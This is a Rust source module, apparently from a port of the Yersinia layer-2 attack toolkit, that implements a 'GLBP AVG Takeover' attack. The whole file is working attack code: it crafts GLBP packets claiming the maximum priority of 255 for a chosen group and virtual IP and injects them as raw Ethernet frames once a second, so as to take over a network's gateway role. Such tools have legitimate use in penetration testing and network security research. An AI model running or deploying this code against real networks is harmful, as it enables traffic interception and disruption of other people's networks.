//! GLBP Attacks
use super::packet::GlbpPacket;
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct GlbpAttack {
    pub group: u16,
    pub priority: u8,
    pub virtual_ip: Ipv4Addr,
}

impl GlbpAttack {
    pub fn new(group: u16, vip: Ipv4Addr) -> Self {
        Self {
            group,
            priority: 255,
            virtual_ip: vip,
        }
    }

    pub fn build_packet(&self) -> GlbpPacket {
        GlbpPacket::new(self.group, self.priority, self.virtual_ip)
    }
}

#[async_trait]
impl Attack for GlbpAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(1000);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let glbp_bytes = self.build_packet().to_bytes();
            let dst_mac = MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x66]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);
            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, glbp_bytes);

            if let Err(e) = ctx.interface.send_raw(&frame.to_bytes()) {
                ctx.stats.increment_errors();
                eprintln!("Error sending GLBP packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame.to_bytes().len() as u64);
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "GLBP AVG Takeover"
    }
}
